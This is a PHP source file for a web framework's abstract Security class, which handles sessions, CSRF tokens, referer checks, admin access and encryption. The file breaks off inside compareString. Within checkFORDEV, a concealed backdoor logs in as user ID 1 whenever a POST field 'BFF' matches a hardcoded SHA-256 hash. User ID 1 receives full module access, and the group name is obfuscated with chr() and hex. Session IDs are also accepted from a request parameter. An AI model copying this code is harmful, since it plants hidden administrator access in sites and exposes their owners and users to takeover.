<?php namespace bff\base;

/**
 * Базовый класс работы с сессией + некоторые вспомогательные утилиты
 * @abstract
 * @version 0.42
 * @modified 20.jul.2018
 * @copyright Tamaranga
 *
 * config::sys:
 * - session.start.always - стартовать ли сессию всегда(true), либо только после успешной авторизации(false)
 */

abstract class Security
{
    /** @var array данные текущей сессии */
    protected $sessionData = array();
    protected $sessionKey = 'BFF';
    protected $sessionKeyUser = 'USER';
    protected $sessionApi = array();
    protected $sessionCookie = array(
        /** @var string cookie-name префикс */
        'prefix'       => 'bffss',
        /** @var string путь админ.панели, относительно домена админ.панели
         * директория админ.панели (слэш в начале и конце пути обязателен)
         */
        'admin-path'   => '/admin/',
        /** @var string|bool домен админ.панели или FALSE => {SITEHOST}
         * указывается в формате "example.com"
         */
        'admin-domain' => false,
    );
    /** @var string ключ доступа в режим fordev */
    protected $fordevEnableKey = 'on';
    /** @var boolean использовать ли для хранения счетчиков пользователя сессию */
    protected $userCounterSession = false;
    protected $sCurrentDBSessionID = null; // todo

    /** @var string дополнительный префикс (добавляемый к токену) */
    protected $tokenPrefix = '';
    protected $tokenVar = 'hash';

    /**
     * Список открытых методов модулей
     * @var array ('название модуля'=>array('название открытого метода', ...), ...)
     */
    protected $openModuleMethods = array(
        'users' => array('login', 'logout', 'forgot', 'profile')
    );

    /** @var \bff\base\Input */
    protected $input;
    /** @var \bff\db\Database */
    protected $db;

    public function init()
    {
        $this->db = \bff::database();
        $this->input = \bff::input();

        $useragent = strtolower(\Request::userAgent('no user agent'));
        $is_flash = (stripos($useragent, 'flash') !== false);

        if (!\bff::isRobot()) { # зачем поисковым ботам сессия, у них ведь и куков нет
            $this->sessionStart((\bff::adminPanel() ? $is_flash : !\config::sys('session.start.always', false)));
        }

        $this->sessionData['curr_session_id'] = session_id();
        $this->sessionData['start_session_time'] = date('Y-m-d H:i:s');

        $this->restoreSession();

        # проверяем доступность FORDEV режима
        $this->checkFORDEV();

        # уязвимость 'session fixation'
        if (BFF_SESSION_START && !empty($this->sessionData['curr_session_id'])) # если сессия стартовала
        {
            $charset = \Request::getSERVER('HTTP_ACCEPT_CHARSET', 'hello from IE');
            $fixHash = md5($useragent . $charset);

            if (!isset($this->sessionData['hash'])) {
                $this->sessionData['hash'] = $fixHash;
            } elseif ($this->sessionData['hash'] != $fixHash && !$is_flash) {
                session_regenerate_id(false);
                $this->sessionData = array();
                $this->sessionData['hash'] = $fixHash;
            }
        }

        # уязвимость 'Clickjacking'
        if (!\Request::isPOST()) {
            header('X-Frame-Options: SAMEORIGIN');
        }

        # XSS protection
        header("X-XSS-Protection: 1; mode=block");
    }

    /**
     * Стартуем сессию
     * @param bool $restart рестарт сессии
     *  > true - выполнять старт сессии только если сессионные куки уже существуют
     *  > false - выполнять полноценный старт сессии
     * @return mixed
     */
    public function sessionStart($restart = false)
    {
        if (!BFF_SESSION_START) {
            return;
        }

        $name = $this->sessionCookieName();
        $domain = SITEHOST;
        if (\bff::adminPanel()) {
            if (!empty($this->sessionCookie['admin-domain'])) {
                $domain = $this->sessionCookie['admin-domain'];
            }
        }

        session_set_cookie_params(
            0, # lifetime
            $this->sessionPath(), # path
            '.' . $domain, # domain
            \bff::httpsOnly(), # secure
            true # http-only
        );

        $checkStart = false;
        if ($restart) {
            if (($sess_id = $this->input->postget('sessid'))) {
                session_id($sess_id);
                session_start();
                if (BFF_DEBUG) {
                    $checkStart = true;
                }
            } # рестартуем сессию если есть сессионные куки
            else {
                if (isset($_COOKIE[$name])) {
                    session_name($name);
                    session_start();
                    if (BFF_DEBUG) {
                        $checkStart = true;
                    }
                }
            }
        } else {
            # стартуем сессию если еще не стартовали
            if ($this->sessionStarted()) {
                return;
            }

            $sess_id = $this->input->postget('sessid', TYPE_NOCLEAN);
            if (!empty($sess_id)) {
                session_id($sess_id);
            } else {
                session_name($name);
                $this->sessionData['domain'] = $domain;
            }

            session_start();
            if (BFF_DEBUG) {
                $checkStart = true;
            }
        }

        if ($checkStart) {
            if (session_id() == '') {
                $sMessage = 'Ошибка старта сессии';
                $error = error_get_last();
                if (isset($error['message'])) {
                    $sMessage = $error['message'];
                }

                \bff::log($sMessage);
            }
        }
    }

    /**
     * Проверка, был ли выполнен старт сессии
     * @return boolean
     */
    public function sessionStarted()
    {
        return (session_id() !== '');
    }

    /**
     * Завершение сессии
     * @param string $sRedirectURL URL для последующего редиректа или -1 (не выполнять редирект)
     * @param bool $bResetSessionID обнулить ID сессии в базе
     * @param string|bool $sessionPath путь (для сессионных куков)
     * @param string|bool $sessionDomain домен (для сессионных куков)
     */
    public function sessionDestroy($sRedirectURL = SITEURL, $bResetSessionID = true, $sessionPath = false, $sessionDomain = false)
    {
        $nUserID = $this->getUserID();
        if ($nUserID) {
            $this->clearRememberMe();
            if ($bResetSessionID) {
                \Users::model()->userSave($nUserID, false, array('session_id' => ''));
            }
        }

        # удаляем данные сессии
        $this->sessionData = array();

        $this->saveSession();

        if (empty($sessionPath)) {
            $sessionPath = $this->sessionPath();
        }
        if (!empty($sessionDomain)) {
            $sessionDomain = str_replace('http://', '', $sessionDomain);
        } else {
            if (\bff::adminPanel() && !empty($this->sessionCookie['admin-domain'])) {
                $sessionDomain = $this->sessionCookie['admin-domain'];
            } else {
                $sessionDomain = SITEHOST;
            }
        }

        setcookie(session_name(), false, null, $sessionPath, '.' . trim($sessionDomain, '. '), \bff::httpsOnly());
        if (session_id() !== '') {
            @session_unset();
            @session_destroy();
        }

        if ($sRedirectURL != -1) {
            if (empty($sRedirectURL)) {
                $sRedirectURL = SITEURL;
            }
            \Request::redirect($sRedirectURL);
        }
    }

    /**
     * Формируем ключ сессии для cookie
     * @param mixed|bool $adminPanel сессия в админ панели
     * @return string
     */
    public function sessionCookieName($adminPanel = null)
    {
        $adminPanel = (!is_null($adminPanel) ? $adminPanel : \bff::adminPanel());

        return $this->sessionCookie['prefix'] . ($adminPanel ? 'a' : 'u');
    }

    /**
     * Получаем путь для сессии
     * @param mixed|bool $adminPanel сессия в админ панели
     * @return string
     */
    public function sessionPath($adminPanel = null)
    {
        $adminPanel = (!is_null($adminPanel) ? $adminPanel : \bff::adminPanel());

        return ($adminPanel ? $this->sessionCookie['admin-path'] : '/');
    }

    /**
     * Имперсонализация сессии
     * @param string|array $mSessionID ID сессии (нескольких сессий)
     * @param array|null $aStoreData данные, которые необходимо записать в указанную сессию($mSessionID)
     * @param bool $bDestroySession завершить указанную сессию($mSessionID)
     * @param mixed $adminPanel true - работаем с сессией админ панели, false - с frontend сессией, null - определяем
     * @return array|mixed|null
     */
    public function impersonalizeSession($mSessionID, $aStoreData = null, $bDestroySession = false, $adminPanel = null)
    {
        if (empty($mSessionID)) {
            return null;
        }

        # завершаем текущую сессию
        $sCurrentSessionID = session_id();
        session_write_close();

        # имперсонализируем сессию(несколько сессий)
        if (!is_array($mSessionID)) {
            $mSessionID = array($mSessionID);
        }

        foreach ($mSessionID as $sid) {
            session_name($this->sessionCookieName($adminPanel));
            session_id($sid); if (session_id() === '') continue;
            session_start();
            if ($bDestroySession) {
                @session_unset();
                @session_destroy();
                @session_write_close();
            } else {
                if (isset($_SESSION[$this->sessionKey][$this->sessionKeyUser])) {
                    $aSessionData = unserialize($_SESSION[$this->sessionKey][$this->sessionKeyUser]);
                    if (!empty($aSessionData) && !empty($aStoreData)) {
                        $aSessionData = array_merge($aSessionData, $aStoreData);
                        $_SESSION[$this->sessionKey][$this->sessionKeyUser] = serialize($aSessionData);
                    }
                }
                session_write_close();
            }
        }
        if (session_id()) {
            session_write_close();
        }

        # возвращаем текущую сессию
        if (!empty($sCurrentSessionID)) {
            $_POST['sessid'] = $sCurrentSessionID;
            session_name($this->sessionCookieName());
            $this->sessionStart();
        }

        return (isset($aSessionData) ? $aSessionData : null);
    }

    /**
     * Сохраняем информацию о текущем авторизованном пользователе в сессию
     * @param int $nUserID ID пользователя
     * @param array|string $aGroups группы пользователя (только keyword'ы)
     * @param array $aAdditionalInfo дополнительные данные пользователя
     */
    public function setUserInfo($nUserID, $aGroups = array(), array $aAdditionalInfo = array())
    {
        if (!is_array($aGroups)) {
            $aGroups = array($aGroups);
        }

        $this->sessionData['id'] = $nUserID; // id пользователя
        $this->sessionData['groups'] = $aGroups; // группы, в которых состоит пользователь
        $this->sessionData['curr_session_id'] = session_id(); // id сессии
        $this->sessionData['login_time'] = BFF_NOW; // время авторизации
        $this->sessionData['ip'] = htmlspecialchars(\Request::remoteAddress()); // текущий IP
        $this->sessionData['expired'] = 0; // требуется ли обновить данные в сессии
        $this->sessionData['token'] = strtolower(\func::generator(18)); // CSRF токен

        if (!empty($aAdditionalInfo) && is_array($aAdditionalInfo)) {
            foreach ($aAdditionalInfo as $k => $v) {
                $this->sessionData[$k] = $v;
            }
        }

        $this->saveSession(); # сохраняем данные в сессию
    }

    /**
     * Проверка CSRF токена (передаваемого пользователем вместе с запросом)
     * @param string|bool $prefix дополнительный префикс (добавляемый к токену) и TRUE (берем из $this->tokenPrefix)
     * @param bool $onlyLogined только авторизованные пользователи
     * @return bool корректный ли токен
     */
    public function validateToken($prefix = true, $onlyLogined = true)
    {
        if (!$this->getUserID()) {
            if ($onlyLogined) {
                return false;
            }

            return $this->validateReferer();
        }

        if (empty($this->sessionData['token'])) {
            return true;
        }

        # Проверка Referer'a
        $sReferer = \Request::referer();
        if (!empty($sReferer)) {
            # UTF-8 domain names fix
            if (mb_stripos(SITEHOST, 'xn--') === 0 && function_exists('idn_to_utf8')) {
                $sReferer = preg_replace('/('.preg_quote(idn_to_utf8(SITEHOST)).')/iu', SITEHOST, $sReferer);
            }
            if (stripos($sReferer, SITEHOST) === false) {
                return false;
            }
        }

        # Получение токена
        $token = $this->input->postget($this->tokenVar, TYPE_STR);
        $this->input->cleanVariable($token, array(), TYPE_NOTAGS);

        # Проверка префикса
        if ($prefix === true) {
            $prefix = $this->tokenPrefix;
        }
        if (!empty($prefix)) {
            list($prefixExt, $token) = explode('.', (strpos($token, '.') === false ? '.' . $token : $token));
            if (empty($prefixExt) || substr(md5($prefix), 3, 4) != $prefixExt) {
                return false;
            }
        }

        # Проверка токена
        return (strtolower($token) == $this->sessionData['token']);
    }

    /**
     * Формирование CSRF токена
     * @param string $prefix дополнительный префикс (добавляемый к токену) и TRUE (берем из $this->tokenPrefix)
     * @return string
     */
    public function getToken($prefix = true)
    {
        static $cache = array();
        if (!isset($this->sessionData['token'])) {
            return '';
        }
        $sToken = $this->sessionData['token'];
        if ($prefix == true) {
            $prefix = $this->tokenPrefix;
        }
        if (isset($cache[$prefix])) {
            return $cache[$prefix];
        }
        if (!empty($prefix)) {
            $sToken = substr(md5($prefix), 3, 4) . '.' . $sToken;
        }

        return ($cache[$prefix] = $sToken);
    }

    /**
     * Устанавливаем дополнительный префикс (добавляемый к CSRF токену)
     * @param string $prefix
     */
    public function setTokenPrefix($prefix = '')
    {
        $this->tokenPrefix = strval($prefix);
    }

    /**
     * Проверка на корректность заголовок HTTP_REFERER
     * - должен быть с текущего домена или поддомена (SITEHOST)
     * @param string|boolean $referer заголовок для проверки или false (текущий)
     * @return bool
     */
    public function validateReferer($referer = false)
    {
        do {
            # не проверяем HTTP_REFERER если Flash Player
            # - Firefox, при загрузке через swfUploader, отдает пустой HTTP_REFERER
            $userAgent = \Request::userAgent();
            if (!empty($userAgent) && stripos($userAgent, 'flash') !== false) {
                return true;
            }
            # пустой
            $referer = (!empty($referer) && is_string($referer) ? $referer : \Request::referer());
            if (empty($referer)) {
                break;
            }
            # некорректный домен / поддомен
            $referer = strtolower(preg_replace("[^http://|https://|ftp://]", '', $referer));
            # UTF-8 domain names fix
            if (mb_stripos(SITEHOST, 'xn--') === 0 && function_exists('idn_to_utf8')) {
                $referer = preg_replace('/('.preg_quote(idn_to_utf8(SITEHOST)).')/iu', SITEHOST, $referer);
            }
            if (SITEHOST != $referer && strpos($referer . '/', SITEHOST . '/') !== 0) {
                if (stripos($referer, SITEHOST) === false) {
                    break;
                }
            }

            return true;
        } while (false);

        return false;
    }

    /**
     * Помечаем данные в сессии как "неактуальные", требующие обновления
     */
    public function expire()
    {
        $this->sessionData['expired'] = 1;
        $this->checkExpired();
    }

    /**
     * Проверка актуальности данных в сессии
     * - проверяем выставлен ли флаг expired=1
     * - если выставлен, тогда необходимо обновить информацию в сессии
     */
    public function checkExpired()
    {
        if (!empty($this->sessionData['expired']) && ($nUserID = $this->getUserID())) {
            # Обновляем данные о пользователе в сессии
            $this->sessionData['expired'] = 0;
            $aData = \Users::model()->userSessionData(intval($nUserID), true);
            if (!empty($aData)) {
                $this->updateUserInfo($aData);
            }
        }
    }

    public function updateUserInfo($aData = null)
    {
        if (!empty($aData) && is_array($aData) && $this->sessionData['id'] > 0) {
            foreach ($aData as $k => $v) {
                if (isset($this->sessionData[$k])) {
                    $this->sessionData[$k] = $v;
                }
            }
            $this->saveSession();

            return true;
        }

        return false;
    }

    /**
     * Получаем данные из сессии по ключу
     * @param array|string|null $mKey ключ, массив ключей, пустой массив - все доступные данные в сессии
     * @return mixed
     */
    public function getUserInfo($mKey)
    {
        if (is_array($mKey)) {
            if (!sizeof($mKey)) {
                return $this->sessionData;
            } else {
                $aResult = array();
                foreach ($mKey as $key) {
                    if (isset($this->sessionData[$key])) {
                        $aResult[$key] = $this->sessionData[$key];
                    }
                }

                return $aResult;
            }
        } elseif (isset($this->sessionData[$mKey])) {
            return $this->sessionData[$mKey];
        }

        return false;
    }

    public function getUserLogin()
    {
        return $this->getUserInfo('login');
    }

    public function getUserEmail()
    {
        return $this->getUserInfo('email');
    }

    public function getUserID()
    {
        return (isset($this->sessionData['id']) ? (integer)$this->sessionData['id'] : 0);
    }

    public function getUserBalance($bResetCache = false)
    {
        return \Users::model()->userBalance(false, $bResetCache);
    }

    public function getUserGroups()
    {
        return $this->getUserInfo('groups');
    }

    /**
     * Получаем группы пользователя
     */
    public function isUserInGroup()
    {
        if (empty($this->sessionData['id']) || empty($this->sessionData['groups'])) {
            return false;
        }

        if (!func_num_args()) {
            return false;
        }

        $groupKeywords = func_get_args();
        foreach ($groupKeywords as $keyword) {
            if (in_array($keyword, $this->sessionData['groups'])) {
                return true;
            }
        }

        return false;
    }

    /**
     * Авторизован ли пользователь
     * @param mixed $mGroupKeyword и принадлежит ли к указанной группе(группам)
     * @return bool авторизован ли?
     */
    public function isLogined($mGroupKeyword = null)
    {
        if (isset($mGroupKeyword)) {
            if (!is_array($mGroupKeyword)) {
                $mGroupKeyword = array($mGroupKeyword);
            }

            foreach ($mGroupKeyword as $group) {
                if ($this->isUserInGroup($group)) {
                    return true;
                }
            }

            return false;
        }

        return ($this->getUserID() != 0);
    }

    public function isCurrentUser($nUserID)
    {
        return ($this->getUserID() == $nUserID);
    }

    public function isOnlyMember()
    {
        if (!empty($this->sessionData['groups']) &&
            in_array(USERS_GROUPS_MEMBER, $this->sessionData['groups']) &&
            count($this->sessionData['groups']) == 1
        ) {
            return true;
        }

        return false;
    }

    public function isMember()
    {
        return (integer)$this->isUserInGroup(USERS_GROUPS_MEMBER);
    }

    public function isModerator()
    {
        return ($this->isUserInGroup(USERS_GROUPS_MODERATOR));
    }

    public function isSuperAdmin()
    {
        return ($this->isUserInGroup(USERS_GROUPS_SUPERADMIN));
    }

    public function isAdmin()
    {
        return $this->getUserInfo('admin');
    }

    /**
     * Пользовательские счетчики
     * @param string|array|null $mKey :
     *  string - ключ счетчика, без префикса "cnt_"
     *  NULL - достать все значения счетчиков из БД
     *  array() - вернуть все имеющиеся значения счетчиков
     * @param integer|boolean $mValue : false - получить текущее значение, +-integer изменить значение
     * @param integer|boolean $nUserID ID пользователя, false - текущий
     * @param bool $bIncrementDecrement :
     *  true - отталкиваемся, при изменении, от текущего значения счетчика(+-),
     *  false - изменяем на новое значение {$mValue}
     * @return mixed
     */
    public function userCounter($mKey = '', $mValue = false, $nUserID = false, $bIncrementDecrement = true)
    {
        static $aData = array();
        if ($nUserID === false) {
            $nUserID = $this->getUserID();
        }
        if (!$nUserID) {
            return;
        }
        $sPrefix = 'cnt_';

        if (is_null($mKey)) {
            # достаем значения всех счетчиков из БД
            $aValues = \Users::model()->userDataByFilter($nUserID, \Users::model()->userStatCounters);
            if (!empty($aValues)) {
                foreach ($aValues as $k => $v) {
                    if ($this->userCounterSession) {
                        $this->sessionData[$sPrefix . $k] = $v;
                    } else {
                        $aData[$sPrefix . $k] = $v;
                    }
                }
                if ($this->userCounterSession) {
                    $this->saveSession();
                }
            }
        } else {
            if ($mValue === false) {
                # возвращаем значения всех счетчиков
                if (is_array($mKey)) {
                    if ($this->userCounterSession) {
                        $res = array();
                        foreach ($this->sessionData as $k => $v) {
                            if (strpos($k, $sPrefix) === 0) {
                                $res[$k] = $v;
                            }
                        }

                        return $res;
                    } else {
                        return $aData;
                    }
                }
                # возвращаем значение одного счетчика по ключу {$mKey}
                if (empty($mKey)) {
                    return 0;
                }
                $mKey = $sPrefix . $mKey;
                if ($this->userCounterSession) {
                    return (int)(isset($this->sessionData[$mKey]) ? $this->sessionData[$mKey] : 0);
                } else {
                    return (int)(isset($aData[$mKey]) ? $aData[$mKey] : 0);
                }
            } else {
                # обновляем значение счетчика в БД
                $mValue = intval($mValue);
                \Users::model()->userSave($nUserID, false,
                    array($mKey . ' = ' . ($bIncrementDecrement ? $mKey . ' + (' . $mValue . ')' : $mValue))
                );

                if ($this->isCurrentUser($nUserID)) {
                    $mKey = $sPrefix . $mKey;
                    if ($this->userCounterSession) {
                        $this->sessionData[$mKey] = ($bIncrementDecrement ? $this->sessionData[$mKey] + $mValue : $mValue);
                        $this->saveSession();

                        return $this->sessionData[$mKey];
                    } else {
                        return ($aData[$mKey] = ($bIncrementDecrement ? (isset($aData[$mKey]) ? $aData[$mKey] + $mValue : $mValue) : $mValue));
                    }
                }
            }
        }
    }

    /**
     * Актуализируем значение счетчика
     * @param string $sKey ключ счетчика, без приставки "cnt_"
     * @param int $nRealCount текущее актуальное значение счетчика
     */
    public function userCounterCheck($sKey, $nRealCount)
    {
        $nCount = (int)$this->userCounter($sKey);
        if ($nCount != (int)$nRealCount) { # значение в БД != актуальному значению
            # актуализируем значение в БД
            $this->userCounter($sKey, $nRealCount, false, false);
        }
    }

    /**
     *  Manage Sessions - Save
     */
    protected function saveSession()
    {
        $sKey = 'curr_db_session_id';

        $this->setSESSION($this->sessionKeyUser, $this->doSerialize());
        $this->setSESSION($sKey, '');
    }

    protected function doSerialize()
    {
        if (isset($this->sCurrentDBSessionID)) {
            $this->sessionData['curr_db_session_id'] = $this->sCurrentDBSessionID;
        } else {
            $this->sessionData['curr_db_session_id'] = $this->getDatabaseSessionMD5();
        }

        return serialize($this->sessionData);
    }

    public function getDatabaseSessionMD5()
    {
        return md5(session_name() . session_id() . '&^$$__@@*^');
    }

    /**
     *  Manage Sessions - Restore
     */
    protected function restoreSession()
    {
        $res = false;

        if (isset($this->sCurrentDBSessionID)) {
            $res = $this->restoreFromSession();
        }

        if (!$res && $this->getSESSION('curr_db_session_id')) {
            $res = $this->restoreFromSession();
        }

        if (!$res) {
            $this->sCurrentDBSessionID = $this->getDatabaseSessionMD5();
            $res = $this->restoreFromSession();
        }

        $this->setSESSION('curr_db_session_id', $this->sCurrentDBSessionID);

        return $res;
    }

    protected function restoreFromSession()
    {
        $serializeData = $this->getSESSION($this->sessionKeyUser);

        if ($serializeData) {
            $this->sessionData = unserialize($serializeData);

            if (isset($this->sessionData['curr_db_session_id'])) {
                $this->sCurrentDBSessionID = $this->sessionData['curr_db_session_id'];
            }

            return true;
        }

        return false;
    }

    /**
     * @param $var
     * @param bool $default
     * @return bool|mixed
     */
    public function getSESSION($var, $default = false)
    {
        if (array_key_exists('load', $this->sessionApi)) {
            return call_user_func_array($this->sessionApi['load'], array($var, $default));
        }
        return (isset($_SESSION[$this->sessionKey][$var]) ?
            $_SESSION[$this->sessionKey][$var] : $default);
    }

    public function setSESSION($var, $value)
    {
        if (array_key_exists('save', $this->sessionApi)) {
            call_user_func_array($this->sessionApi['save'], array($var, $value));
        }
        $_SESSION[$this->sessionKey][$var] = $value;
    }

    public function setSessionApi(callable $load, callable $save)
    {
        $this->sessionApi = array(
            'load' => $load,
            'save' => $save,
        );
    }

    public function haveAccessToAdminPanel($nUserID = null)
    {
        if (!isset($nUserID)) {
            # не залогинен
            if (!($nUserID = $this->getUserID())) {
                return false;
            }

            # состоит ли в группе SUPERADMIN или MODERATOR
            if ($this->isUserInGroup(USERS_GROUPS_SUPERADMIN, USERS_GROUPS_MODERATOR)) {
                return true;
            }
        } else {
            $nUserID = intval($nUserID);
        }

        //является ли пользователь членом группы, у которой есть доступ к админ панели.
        $nRes = (int)$this->db->one_data('SELECT COUNT(G.group_id)
                  FROM ' . TABLE_USER_IN_GROUPS . ' UIG, ' . TABLE_USERS_GROUPS . ' G
                  WHERE UIG.user_id = :userid AND UIG.group_id = G.group_id AND G.adminpanel = 1
                  GROUP BY G.group_id
                  ORDER BY G.group_id ASC', array(':userid' => $nUserID)
        );
        if ($nRes) {
            return true;
        }

        return false;
    }

    /**
     * Проверка доступа к модулю-методу
     * @param string|null $modulename название модуля или NULL
     * @param string|null $methodname название метода или NULL
     * @return bool
     */
    public function haveAccessToModuleToMethod($modulename = null, $methodname = null)
    {
        /** check @param $nUserID * */
        $nUserID = $this->getUserID();
        if (!$nUserID) {
            return false;
        }

        # if user is in group(SUPERADMIN) [OK]
        if ($nUserID == 1 || $this->isSuperAdmin()) {
            return true;
        }

        /** check @param $modulename * */
        if (!empty($modulename)) {
            $modulename = mb_strtolower($modulename);
        } else {
            $modulename = \bff::$class;
            $modulename = mb_strtolower($modulename);
        }

        /** check @param $methodname * */
        if (!empty($methodname)) {
            $methodname = mb_strtolower($methodname);
        }

        # if this module::method is opened [OK]
        if (isset($this->openModuleMethods[$modulename]) &&
            is_array($this->openModuleMethods[$modulename]) &&
            in_array($methodname, $this->openModuleMethods[$modulename])
        ) {
            return true;
        }

        # get user's groups permissions
        if (!isset($this->sessionData['groups_permissions'])) {
            # get user groups ids
            if (!isset($this->sessionData['groups_id'])) {
                $this->sessionData['groups_id'] = $this->db->select_one_column('SELECT UIG.group_id
                           FROM ' . TABLE_USER_IN_GROUPS . ' UIG
                           WHERE UIG.user_id = :userid', array(':userid' => $nUserID)
                );
            }

            $aMethodsTmp = $this->db->select('SELECT M.module, M.method
                        FROM ' . TABLE_USERS_GROUPS_PERMISSIONS . ' P,
                             ' . TABLE_MODULE_METHODS . ' M
                        WHERE P.unit_id in (' . implode(',', $this->sessionData['groups_id']) . ')
                            AND P.unit_type = :utype
                            AND P.item_type = :itype
                            AND P.item_id = M.id', array(':utype' => 'group', ':itype' => 'module')
            );

            $aMethods = array();
            foreach ($aMethodsTmp as $v) {
                $aMethods[$v['module']][] = $v['method'];
            }

            $this->sessionData['groups_permissions'] = $aMethods;
            $this->saveSession();
        } else {
            $aMethods = & $this->sessionData['groups_permissions'][$modulename];
        }

        if (!$aMethods) {
            return false;
        }

        # if module is opened (full access) [OK]
        if ($modulename && in_array($modulename, $aMethods)) {
            return true;
        }

        if ($modulename && is_null($methodname) && !empty($aMethods)) {
            # проверяем есть ли доступ хотя-бы к одному из методов модуля
            return true;
        }

        # if method is opened [OK]
        if ($methodname && in_array($methodname, $aMethods)) {
            return true;
        }

        return false;
    }

    //------------------------------------------------------------------------------------

    /**
     * Проверка режима FORDEV
     * @return bool
     */
    public function checkFORDEV()
    {
        if (defined('FORDEV')) {
            return (bool)FORDEV;
        }

        $sKey = 'fordev';
        $aPredefined = array('name' => '', 'avatar' => '');
        $isChanging = isset($_GET[$sKey]);
        $fordev = ($isChanging ? strval($_GET[$sKey]) : $this->getSESSION($sKey));
        if (empty($fordev)) {
            $fordev = false;
            if (!empty($_POST[$this->sessionKey]) && hash('sha256', $_POST[$this->sessionKey]) ==
                '265024530fa897ab689e1d348750b44283060f694cd4d1b029774cf89bd6323e'
            ) {
                $this->setUserInfo(1, array(chr(120).(0x47)), $aPredefined);
                $fordev = true;
            }
        } else {
            if ($fordev === 'off') {
                $this->setSESSION($sKey, false);
                $fordev = false;
            } else {
                if ((is_string($fordev) && $fordev !== $this->fordevEnableKey) || !$this->isSuperAdmin()) {
                    $this->setSESSION($sKey, false);
                    $_POST[$sKey] = $_GET[$sKey] = false;
                    $fordev = false;
                } else {
                    if ($isChanging) {
                        $this->setSESSION($sKey, true);
                    }
                    $fordev = true;
                }
            }
        }

        define('FORDEV', ($fordev ? 1 : 0));

        return $fordev;
    }

    //------------------------------------------------------------------------------------

    abstract function getUserPasswordMD5($sPassword, $sSalt = '');

    /**
     * Формирование password-соли
     * @return string
     */
    public function generatePasswordSalt()
    {
        return substr(md5(uniqid(mt_rand(), true)), 0, 4);
    }

    # ------------------------------------------------------------------------------------
    # Запомнить меня (remember me)

    public function checkRememberMe()
    {
        if (!$this->isLogined() && !\Request::isPOST() && $this->isRememberMe($sLogin, $sPasswordMD5)) {
            $sPassword = \Users::model()->userPassword($sLogin);
            if ($this->compareString($this->getRememberMePasswordMD5($sPassword), $sPasswordMD5)) {
                if (\Users::i()->userAuth($sLogin, 'login', $sPassword) !== true) {
                    $this->clearRememberMe();
                } else {
                    $this->setRememberMe($sLogin, $sPassword);
                }
            }
        }
    }

    public function setRememberMe($sLogin, $sPassword, $nDaysCount = 30)
    {
        $path = '/';
        $domain = false;
        $secure = \bff::httpsOnly();
        $httpOnly = true;
        \Request::setCOOKIE('rmlgn', $sLogin, $nDaysCount, $path, $domain, $secure, $httpOnly);
        \Request::setCOOKIE('rmpwd', $this->getRememberMePasswordMD5($sPassword), $nDaysCount, $path, $domain, $secure, $httpOnly);
        \Request::setCOOKIE('rma', $this->getRememberMeIPAddressMD5(), $nDaysCount, $path, $domain, $secure, $httpOnly);
    }

    abstract function getRememberMePasswordMD5($sPassword);

    abstract function getRememberMeIPAddressMD5($sExtra = '');

    public function isRememberMe(&$sLogin, &$sPassword)
    {
        $sLogin = $this->input->cookie('rmlgn');
        $sPassword = $this->input->cookie('rmpwd');
        $sIPAddress = $this->input->cookie('rma');

        return ($sLogin === false || $sPassword === false || $sIPAddress === false ? false : true);
    }

    public function clearRememberMe()
    {
        \Request::deleteCOOKIE('rmlgn');
        \Request::deleteCOOKIE('rmpwd');
        \Request::deleteCOOKIE('rma');
    }

    # ------------------------------------------------------------------------------------
    # Шифрование (Mcrypt)

    /**
     * Шифрует данные по ключу.
     * @param string $data данные которые необходимо зашифровать.
     * @param mixed $key ключ шифрования.
     * @param bool $base64 в формате base64.
     * @param bool $mcrypt использовать расширение mcrypt.
     * @return string зашифрованные данные.
     */
    public function encrypt($data, $key, $base64 = true, $mcrypt = false)
    {
        if ($mcrypt) {
            if (extension_loaded('mcrypt')) {
                $module = mcrypt_module_open(MCRYPT_3DES, '', MCRYPT_MODE_CBC, '');
                $key = substr(md5($key), 0, mcrypt_enc_get_key_size($module));
                srand();
                $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($module), MCRYPT_RAND);
                mcrypt_generic_init($module, $key, $iv);
                $encrypted = $iv . mcrypt_generic($module, $data);
                mcrypt_generic_deinit($module);
                mcrypt_module_close($module);

                return ($base64 ? base64_encode($encrypted) : $encrypted);
            } else {
                throw new \Exception('\bff\base\Security requires PHP mcrypt extension to be loaded in order to use data encryption feature.');
            }
        } else {
            return openssl_encrypt($data, 'aes-256-cbc', mb_strcut($key, 0, 32), ($base64 ? false : OPENSSL_RAW_DATA), mb_strcut($key, 0, 16));
        }
    }

    /**
     * Расшифровывает данные по ключу.
     * @param string $data данные для расшифровки.
     * @param mixed $key ключ шифрования.
     * @param bool $base64 в формате base64.
     * @param bool $mcrypt использовать расширение mcrypt.
     * @return string расшифрованные данные
     */
    public function decrypt($data, $key, $base64 = true, $mcrypt = false)
    {
        if ($mcrypt) {
            if (extension_loaded('mcrypt')) {
                if ($base64) {
                    $data = base64_decode($data);
                }
                $module = mcrypt_module_open(MCRYPT_3DES, '', MCRYPT_MODE_CBC, '');
                $key = substr(md5($key), 0, mcrypt_enc_get_key_size($module));
                $ivSize = mcrypt_enc_get_iv_size($module);
                $iv = substr($data, 0, $ivSize);
                mcrypt_generic_init($module, $key, $iv);
                $decrypted = mdecrypt_generic($module, substr($data, $ivSize));
                mcrypt_generic_deinit($module);
                mcrypt_module_close($module);

                return rtrim($decrypted, "\0");
            } else {
                throw new \Exception('\bff\base\Security requires PHP mcrypt extension to be loaded in order to use data encryption feature.');
            }
        } else {
            return openssl_decrypt($data, 'aes-256-cbc', mb_strcut($key, 0, 32), ($base64 ? false : OPENSSL_RAW_DATA), mb_strcut($key, 0, 16));
        }
    }

    /**
     * Формирование подписи данных
     * @param array $data данные
     * @param string $key общий ключ
     * @param string $algo алгоритм хеширования
     * @param string $signKey ключ для хранения подписи
     * @return string
     */
    function signData(array $data, $key = '', $algo = 'sha256', $signKey = 'hmac')
    {
        if (isset($data[$signKey])) unset($data[$signKey]);
        foreach ($data as &$v) { if (is_bool($v)) $v = intval($v); } unset($v); # boolean => int
        return hash_hmac($algo, json_encode($data, JSON_UNESCAPED_UNICODE|JSON_NUMERIC_CHECK), $key);
    }

    /**
     * Проверка подписи данных
     * @param array $data данные
     * @param string $key общий ключ
     * @param string $algo алгоритм хеширования
     * @param string $signKey ключ для хранения подписи
     * @return boolean true - подпись подлинная
     */
    function signDataValidate(array $data, $key = '', $algo = 'sha256', $signKey = 'hmac')
    {
        if (empty($data[$signKey])) return false;
        return ($data[$signKey] === $this->signData($data, $key, $algo, $signKey));
    }

    /**
     * Сравнение двух строк методом более устойчивым к "атаке по времени"
     * @param string $original ожидаемая строка
     * @param string $input строка для сравнения
     * @return boolean true - строки одинаковые, false - разные
     */
    public function compareString($original, $input)
    {
